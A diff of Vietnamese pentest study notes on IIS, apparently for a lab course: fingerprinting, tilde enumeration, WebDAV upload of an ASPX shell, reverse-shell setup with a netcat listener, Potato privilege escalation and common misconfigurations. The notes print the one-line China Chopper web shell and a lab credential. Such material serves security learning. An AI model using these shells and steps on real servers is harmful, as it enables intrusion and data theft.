@@ -39,17 +39,17 @@ Bài này nó dạy mày giai đoạn **Trinh sát (Reconnaissance) và Dò đư
 ###  Nhìn version IIS để đoán hệ điều hành và CVE
 Thằng IIS gắn chặt với phiên bản Windows Server. Nhìn thấy version IIS là mày đọc vị được con máy nạn nhân đang chạy Windows gì để tìm CVE phù hợp:
 
-* IIS 6.0: Chạy trên Windows Server 2003. Đồ cổ lỗ sĩ hết hạn hỗ trợ (EOL). Thấy con này ở ngoài public thì 99% là ăn được lỗi Buffer Overflow huyền thoại (CVE-2017-7269) đéo có bản vá chính thức.
+* IIS 6.0: Chạy trên Windows Server 2003. Đồ cổ lỗ sĩ hết hạn hỗ trợ (EOL). Thấy con này ở ngoài public thì 99% là ăn được lỗi Buffer Overflow huyền thoại (CVE-2017-7269) không có bản vá chính thức.
 * IIS 7.0 / 7.5: Windows Server 2008 / 2008 R2 (EOL).
 * IIS 8.0 / 8.5: Windows Server 2012 / 2012 R2 (EOL).
-* IIS 10.0: Windows Server 2016, 2019, 2022. (Nó nhảy cóc từ 8.5 lên thẳng 10.0, đéo có bản 9.x).
+* IIS 10.0: Windows Server 2016, 2019, 2022. (Nó nhảy cóc từ 8.5 lên thẳng 10.0, không có bản 9.x).
 
 > [!NOTE] 
 > ok nhưng mà nhìn cái phiên bản này kiểu gì ?
 
 ###  Hai tầng kiến trúc của IIS mà dân pentest bắt buộc phải nhớ
 ![[Pasted image 20260819114824.png|489]]
-* Tầng 1 - HTTP.sys (Tầng Kernel): Đây là d<u>river chạy ở mức sâu nhất của hệ điều hành</u>, <u>hứng toàn bộ gói tin HTTP trước khi chuyển cho IIS xử lý.</u> Nếu đục trúng lỗ hổng ở tầng này (ví dụ CVE-2022-21907), con server sẽ ăn ngay Màn hình xanh chết chóc (BSOD) sập cả máy, chứ đéo phải lỗi web 500 thông thường.
+* Tầng 1 - HTTP.sys (Tầng Kernel): Đây là d<u>river chạy ở mức sâu nhất của hệ điều hành</u>, <u>hứng toàn bộ gói tin HTTP trước khi chuyển cho IIS xử lý.</u> Nếu đục trúng lỗ hổng ở tầng này (ví dụ CVE-2022-21907), con server sẽ ăn ngay Màn hình xanh chết chóc (BSOD) sập cả máy, chứ không phải lỗi web 500 thông thường.
 * Tầng 2 - Application Pools & w3wp.exe (Tầng User): Mỗi web app chạy độc lập trong một cái hộp gọi là *Application Pool*, thực thi bởi tiến trình `w3wp.exe`. Khi mày up được web shell ASPX lên, <u>shell của mày sẽ chạy dưới quyền của tài khoản này</u> (mặc định là `IIS APPPOOL\ten_pool` hoặc `NETWORK SERVICE`).
 
 > [!NOTE] 
@@ -109,7 +109,7 @@ Khi soi log IIS, các dấu hiệu sau chỉ ra server đang bị sờ gáy:
 > Tóm lại: Soi header ra IIS 10.0 -> Bắn OPTIONS thấy bật WebDAV ở `/webdav/` -> Chuẩn bị đòn tiếp theo là up shell ASPX rồi leo quyền Potato. Mày nắm chắc cái sườn này rồi vào lab thực hành đi!
 
 # 3- IIS tidle Enumeration
-bài này dạy một chiêu trinh sát cực hiểm mà đéo cần tới bất kỳ mã exploit nào: **Lợi dụng lỗi tên file ngắn (8.3 Short Filename / Tilde Enumeration)** để lột sạch các file và thư mục ẩn trên IIS.
+bài này dạy một chiêu trinh sát cực hiểm mà không cần tới bất kỳ mã exploit nào: **Lợi dụng lỗi tên file ngắn (8.3 Short Filename / Tilde Enumeration)** để lột sạch các file và thư mục ẩn trên IIS.
 
 Ngồi ngay ngắn tao thông não 4 mục cốt lõi:
 **1. Nguồn cơn: Cơ chế tên file 8.3 thời đồ đá của Windows**
@@ -120,8 +120,8 @@ Ngồi ngay ngắn tao thông não 4 mục cốt lõi:
 **2. Bản chất lỗ hổng: Tại sao lại dò được file ẩn?**
 * Khi mày gửi một request có dấu ngã `~` lên IIS, server sẽ đem cái chuỗi đó đi so với bảng tên ngắn trong hệ điều hành.
 * Điểm chí mạng: Nếu cái tên ngắn đó **CÓ TỒN TẠI**, con IIS sẽ trả về mã lỗi hoặc dung lượng phản hồi (response size) khác một tí so với khi cái tên đó **KHÔNG TỒN TẠI**.
-* Dựa vào sự khác biệt tí hon này, hacker chỉ cần viết tool gửi request thử từng chữ cái một để ghép thành cái tên ngắn hoàn chỉnh. Mấy thư mục ẩn mà từ điển thông thường đéo đoán ra được thì đòn này quét ra sạch.
-* Lỗi này tồn tại từ IIS 5.x đến tận IIS 10.0 (Windows Server 2022). Bọn Microsoft đéo thèm vá vì coi đây là cơ chế của Windows. Muốn chặn thì admin phải tự vào Registry tắt chức năng tạo tên 8.3.
+* Dựa vào sự khác biệt tí hon này, hacker chỉ cần viết tool gửi request thử từng chữ cái một để ghép thành cái tên ngắn hoàn chỉnh. Mấy thư mục ẩn mà từ điển thông thường không đoán ra được thì đòn này quét ra sạch.
+* Lỗi này tồn tại từ IIS 5.x đến tận IIS 10.0 (Windows Server 2022). Phía Microsoft không vá vì coi đây là cơ chế của Windows. Muốn chặn thì admin phải tự vào Registry tắt chức năng tạo tên 8.3.
 
 **3. Thực hành quét bằng tool `iis_shortname_scan.py**`
 * Mày nhảy vào thư mục tool và nã lệnh:
@@ -143,14 +143,14 @@ python3 iis_shortname_scan.py http://MACHINE_IP/
 ```bash
 curl http://MACHINE_IP/BackupFiles/webdav_notes.txt
 ```
-* Kết quả: Thằng dev não phẳng vứt mẹ file ghi chú chứa **Username** và **Password** của WebDAV vào đây.
+* Kết quả: Thằng dev bất cẩn để quên file ghi chú chứa **Username** và **Password** của WebDAV vào đây.
 Lấy được tài khoản mật khẩu này rồi thì cất kỹ vào túi, tí nữa sang task sau vác đi đăng nhập WebDAV để nhét webshell vào máy nó!
 
 # 4-
 Ở Task 2, mày gửi request PUT ẩn danh vào `/webdav/` bị nó vả cho cái mã 401 Unauthorized vì WebDAV trên Server 2019 bắt buộc phải có tài khoản. Sang Task 3, nhờ trò tilde scan mà mày móc được file `BackupFiles/webdav_notes.txt` chứa sẵn tài khoản: `webdav_user:P@ssw0rd!123`. Giờ là lúc vác đồ chơi ra đục thẳng vào WebDAV.
 
-Khi một thư mục WebDAV vừa cho phép ghi (write) vừa bật quyền chạy script (script execution), mày chỉ việc ném file ASPX lên rồi gọi nó chạy là có ngay quyền thực thi code (RCE), đéo cần dùng tới mã exploit phức tạp nào cả.
-*-> cái này là giới thiệu thôi , lý thuyết vl*
+Khi một thư mục WebDAV vừa cho phép ghi (write) vừa bật quyền chạy script (script execution), mày chỉ việc ném file ASPX lên rồi gọi nó chạy là có ngay quyền thực thi code (RCE), không cần dùng tới mã exploit phức tạp nào cả.
+*-> cái này là giới thiệu thôi , lý thuyết quá*
 ### 3 điều kiện sống còn để cắm shell thành công
 <u>Cả 3 yếu tố này bắt buộc phải xảy ra cùng lúc:</u>
 1. WebDAV được bật trên thư mục mục tiêu.
@@ -221,11 +221,11 @@ Gõ lệnh từng phát một qua web rất tù túng. Muốn quẩy mượt mà
 
 1. Bật netcat trên máy tấn công để lắng nghe ở cổng 443:
 nc -lvnp 443
-(Dùng cổng 443 vì tường lửa mạng doanh nghiệp hầu như đéo bao giờ chặn luồng HTTPS đi ra ngoài).
+(Dùng cổng 443 vì tường lửa mạng doanh nghiệp hầu như không bao giờ chặn luồng HTTPS đi ra ngoài).
 2. Bắn một đoạn script PowerShell một dòng (one-liner) qua web shell để nó gọi ngược về máy mày. Lệnh này sử dụng các cờ quan trọng:
 
 * -NoP: Bỏ qua PowerShell profile.
-* -NonI: Chạy ngầm, đéo hiện cửa sổ tương tác hỏi han.
+* -NonI: Chạy ngầm, không hiện cửa sổ tương tác hỏi han.
 * -W Hidden: Giấu cửa sổ PowerShell.
 * -Exec Bypass: Vượt qua chính sách cấm chạy script (Execution Policy).
 
@@ -239,11 +239,11 @@ Mày sẽ thấy danh sách các cờ đặc quyền của tài khoản, trong �
 
 Cái cờ *SeImpersonatePrivilege* này là mỏ vàng trong giai đoạn hậu khai thác (post-exploitation). Nó cho phép một tiến trình mạo danh bất kỳ tài khoản nào kết nối tới nó ở cấp độ token của Windows. *Mấy con tool leo quyền họ nhà khoai tây (như PrintSpoofer, JuicyPotato, GodPotato) hoạt động bằng cách lừa một tiến trình cấp SYSTEM kết nối vào một đường ống (named pipe) do mày kiểm soát, sau đó lợi dụng cờ SeImpersonatePrivilege để ăn cắp token SYSTEM đó.* Nhờ thế, mày nhảy thẳng từ tài khoản cùi bắp iis apppool\defaultapppool lên quyền tối cao SYSTEM.
 > [!NOTE]
-> Đọc chả hiểu cái lz gì
+> Đọc chả hiểu cái gì
 
 
 Mở rộng: Web shell China Chopper ngoài đời thực
-Con shell cmd.aspx mày vừa viết thì chạy được nhưng lộ liễu vãi lz. Ngoài đời, các nhóm hacker khét tiếng (như HAFNIUM trong vụ hack Exchange ProxyLogon năm 2021) *toàn dùng con shell siêu nhỏ tên là China Chopper*.
+Con shell cmd.aspx mày vừa viết thì chạy được nhưng lộ liễu quá. Ngoài đời, các nhóm hacker khét tiếng (như HAFNIUM trong vụ hack Exchange ProxyLogon năm 2021) *toàn dùng con shell siêu nhỏ tên là China Chopper*.
 
 Điểm dị của China Chopper là phần code cắm trên server chỉ nặng đúng 73 byte, vỏn vẹn một dòng duy nhất:
 <%@ Page Language="Jscript"%><%eval(Request.Item["chopper"],"unsafe");%>
@@ -251,19 +251,19 @@ Con shell cmd.aspx mày vừa viết thì chạy được nhưng lộ liễu vã
 Hacker sẽ dùng một phần mềm client riêng trên máy tính để gửi các payload đã mã hóa qua HTTP POST vào tham số chopper. <u>Bên phòng thủ đi săn con này chủ yếu bằng cách quét tìm các file aspx có dung lượng siêu nhỏ hoặc chứa chuỗi hàm eval( và execute(.</u>
 
 # 6- IIS misconfiguration
-Nãy giờ tao với mày toàn đục vào cái WebDAV được cố tình bật lên. Còn bài này gom lại 7 cái lỗi cấu hình ngáo ngơ kinh điển nhất của IIS. Mấy lỗi này ngoài đời gặp hoài, pentester đéo thèm check mấy cái này mà cứ đòi vác súng to đi bắn là dễ bỏ lỡ mấy con finding húp tiền ngon lành nhất.
+Nãy giờ tao với mày toàn đục vào cái WebDAV được cố tình bật lên. Còn bài này gom lại 7 cái lỗi cấu hình sơ hở kinh điển nhất của IIS. Mấy lỗi này ngoài đời gặp hoài, pentester không thèm check mấy cái này mà cứ đòi vác súng to đi bắn là dễ bỏ lỡ mấy con finding kiếm tiền ngon lành nhất.
 
-Tao tóm gọn 7 cái tật cấu hình ngu cho mày dễ nuốt:
+Tao tóm gọn 7 lỗi cấu hình phổ biến cho mày dễ nuốt:
 
 1. Bật Directory Listing (Lộ danh sách thư mục)
-Khi một thư mục đéo có file mặc định (như index.html hay default.aspx) mà admin lại ngứa tay bật tính năng Directory Browsing trong IIS Manager, server sẽ phơi mẹ hết danh sách file ra thay vì báo lỗi 403 Forbidden.
-Tác hại: Mấy file sao lưu, cấu hình, mã nguồn hay user upload bị phơi sạch cho thiên hạ tải về mà đéo cần đăng nhập.
+Khi một thư mục không có file mặc định (như index.html hay default.aspx) mà admin lại bật tính năng Directory Browsing trong IIS Manager, server sẽ phơi bày toàn bộ danh sách file ra thay vì báo lỗi 403 Forbidden.
+Tác hại: Mấy file sao lưu, cấu hình, mã nguồn hay user upload bị phơi sạch cho thiên hạ tải về mà không cần đăng nhập.
 Cách check: Dùng curl đâm vào mấy thư mục kiểu `/uploads/`. Thấy nó nôn ra file đuôi .bak, .config, .log, .zip, .sql là trúng mánh.
-2. Mở lệnh HTTP PUT và DELETE đéo cần xác thực
-Nếu check OPTIONS ở thư mục gốc mà header Allow: lòi ra lệnh PUT hoặc DELETE mà đéo bắt đăng nhập gì cả, tức là server cho phép khách vãng lai tự do ném file hoặc xóa file. Nhiều thằng admin cấu hình ẩu bật WebDAV trên toàn bộ trang web thay vì chỉ bật ở một thư mục riêng.
+2. Mở lệnh HTTP PUT và DELETE không cần xác thực
+Nếu check OPTIONS ở thư mục gốc mà header Allow: lòi ra lệnh PUT hoặc DELETE mà không bắt đăng nhập gì cả, tức là server cho phép khách vãng lai tự do ném file hoặc xóa file. Nhiều thằng admin cấu hình ẩu bật WebDAV trên toàn bộ trang web thay vì chỉ bật ở một thư mục riêng.
 3. Phơi file web.config ra ngoài
 File web.config là quả tim của ứng dụng ASP.NET, chứa chuỗi kết nối Database, API key, mật khẩu SMTP và các key mã hóa.
-Bình thường IIS sẽ tự động chặn các file .config và trả về lỗi 404. Nhưng nếu admin ngu tay xóa mất rule chặn hoặc cấu hình sai MIME mapping, mày chỉ cần gõ `curl http://target/web.config` là tải được cả file về. Nếu nhận về mã 200 kèm nội dung XML bắt đầu bằng thẻ `<configuration>` thì đây là lỗi nghiêm trọng mức cao.
+Bình thường IIS sẽ tự động chặn các file .config và trả về lỗi 404. Nhưng nếu admin sơ suất xóa mất rule chặn hoặc cấu hình sai MIME mapping, mày chỉ cần gõ `curl http://target/web.config` là tải được cả file về. Nếu nhận về mã 200 kèm nội dung XML bắt đầu bằng thẻ `<configuration>` thì đây là lỗi nghiêm trọng mức cao.
 4. Bật chế độ báo lỗi chi tiết (Verbose Error Messages)
 Khi ứng dụng bị lỗi, nếu để ở chế độ debug thì nó sẽ phun ra toàn bộ .NET stack trace. Cái đống này làm lộ đường dẫn nội bộ máy chủ (kiểu `C:\inetpub\wwwroot\...`), phiên bản .NET, câu lệnh SQL bị lỗi, và đôi khi lộ luôn cả IP nội bộ.
 Chuẩn bài: Trong web.config phải bật `<customErrors mode="On" />` để giấu vết và chỉ hiện trang báo lỗi chung chung.
@@ -273,12 +273,12 @@ ASP.NET có sẵn một cái trang nhật ký chẩn đoán tên là trace.axd. 
 Tác hại: Trang này ghi lại toàn bộ header, dữ liệu người dùng nhập trong form, session cookie và token xác thực. Hacker chui vào đây lụm session cookie rồi gửi lại để cướp phiên đăng nhập của nạn nhân một cách ngọt xớt.
 Chuẩn bài: Phải tắt bằng cách set `<trace enabled="false"/>` trong web.config.
 6. Bật method HTTP TRACE
-Method TRACE sinh ra để kiểm tra mạng bằng cách dội ngược lại y nguyên request mà client gửi lên. Trên môi trường thực tế, nó đéo có tác dụng gì ngoài việc mở đường cho đòn tấn công Cross-Site Tracing (XST) để trộm cookie.
+Method TRACE sinh ra để kiểm tra mạng bằng cách dội ngược lại y nguyên request mà client gửi lên. Trên môi trường thực tế, nó không có tác dụng gì ngoài việc mở đường cho đòn tấn công Cross-Site Tracing (XST) để trộm cookie.
 Cách check: Bắn lệnh `curl -X TRACE http://target -sv`. Nếu nó trả về mã 200 kèm nội dung request thì tức là đang bật. Đúng chuẩn là server phải trả về mã 405 Method Not Allowed.
 Dù các trình duyệt đời mới đã chặn TRACE trong JavaScript, nhưng khi đi pentest mày vẫn phải ném cái này vào báo cáo như một lỗi cấu hình lỏng lẻo.
 7. Cấu hình AppPool chạy bằng tài khoản đặc quyền cao
 Mặc định tài khoản chạy AppPool (ApplicationPoolIdentity) là tài khoản quyền thấp. Nhưng nhiều ông admin sợ dính lỗi phân quyền file hay database nên lười biếng set luôn cho AppPool chạy bằng quyền SYSTEM, Administrator, hoặc Domain Admin.
-Nếu mày đã cắm được con shell ASPX ở bài trước, gõ `whoami` mà thấy nôn ra `nt authority\system` hoặc tài khoản Domain Admin luôn thì chúc mừng, mày đã húp trọn con server mà đéo cần phải nhọc công leo quyền Potato làm gì nữa.
+Nếu mày đã cắm được con shell ASPX ở bài trước, gõ `whoami` mà thấy nôn ra `nt authority\system` hoặc tài khoản Domain Admin luôn thì chúc mừng, mày đã húp trọn con server mà không cần phải nhọc công leo quyền Potato làm gì nữa.
 
 # 7-automation
 Mấy bài trước mày phải gõ `curl` còng cả lưng để soi từng cái header, mò WebDAV rồi bới cơ chế xác thực. Bài này nó dạy mày dùng **Nmap Scripting Engine** (NSE) để tự động hóa toàn bộ đống đó trong đúng một lượt quét.
@@ -290,7 +290,7 @@ Mấy bài trước mày phải gõ `curl` còng cả lưng để soi từng cá
 * `http-iis-webdav-vuln`: <u>Check lỗ hổng</u> bypass xác thực WebDAV đời cổ (CVE-2009-1535 trên IIS 5/6).
 
 > [!NOTE] Title
-> đ cần học đoạn này quá kỹ, ko cần nhớ quá rõ câu lệnh ntn, quan trọng là nhớ nó có những vai trò,chức năng là gì?. Khi dùng thì tra lại hoặc bảo AI nó viết luôn cho
+> không cần học đoạn này quá kỹ, ko cần nhớ quá rõ câu lệnh ntn, quan trọng là nhớ nó có những vai trò,chức năng là gì?. Khi dùng thì tra lại hoặc bảo AI nó viết luôn cho
 
 Quy trình quét thực tế bằng Nmap:
 1. Quét phiên bản dịch vụ:
